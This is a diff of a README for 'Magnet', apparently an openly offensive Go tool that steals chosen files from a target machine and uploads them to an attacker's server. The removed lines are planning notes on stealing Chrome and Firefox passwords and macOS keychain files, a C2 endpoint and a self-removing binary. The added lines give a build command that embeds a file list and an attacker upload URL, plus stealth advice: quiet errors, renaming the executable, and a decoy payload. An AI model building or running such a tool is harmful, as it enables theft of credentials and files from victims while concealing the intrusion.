@@ -1,38 +1,37 @@
 # Magnet
 
-🧲 Grab interisting fil from remote
-
-All the jobs is done at compilation time
-
-
-<!--Difference: it is a cold run, just need the file
-Run mac on docker: vhttps://korben.info/executer-macos-docker.html
-1.A
-
-## Password
-
-### Chrome
-
-Grab password from chrome based browser win:
-https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d
-
-Different platform:
-https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py
-
-### Firefox
-
-https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016
-need to load specific library
-
-Cookie
-
-## Mac OS
-les fichiers intéresssat style password safari dans "keychain":
-~/Library/Keychains, /Library/Keychains/ and /Network/Library/Keychains/
+<div align=center>
+  <code><pre>🧲⚡
+  <strong>Grab interesting files from remote</strong><br>
+  All the jobs is done at compilation time</pre></code>
+</div>
 
 
-1. Qqchose qui se compile en focntion de l'OS + en fonction de l'endpoint de c2
-Faire un makefile en conséquence, 
-2. chaque os a sa liste
-3. binaire self-remove
--->
+
+## Usage
+
+**At compilation time** you need to specify:
+* ***The remote endpoint***, where your will upload juicy files
+* ***The Juicy files***, list of files you want to grab. (File are separated by a comma `,`)
+* ***The target os***, to to fit the target (between: `windows`, `darwin`, `linux`
+
+So the compilation line looks like this:
+```shell
+export FILES=$(cat samples/linux_juicy_files.txt)
+export ENDPOINT=http://[ATTACKER_UPLOAD_SITE]
+GOOS=linux GOARCH=amd64 go build -ldflags "-X main.FileList=$FILES -X main.Endpoint=$ENDPOINT" magnet.go
+```
+
+Then on target machine:
+
+### Notes
+
+* For the remote endpoint , I suggest you to use the `/push` endpoint of a [`gitar`](https://github.com/ariary/gitar) listener
+* The software is built to be stealthy hence:
+  * error handling is not verbose (hidden flag to get more verbosity `-thisisdebug`)
+  * I suggest to overwrite usage string in `magnet.go` to fit your attack scenario
+  * rename `magnet` executable
+
+## To do
+
+Include a fake payload that will also be run to fake an attacking scenario (example update, etc)
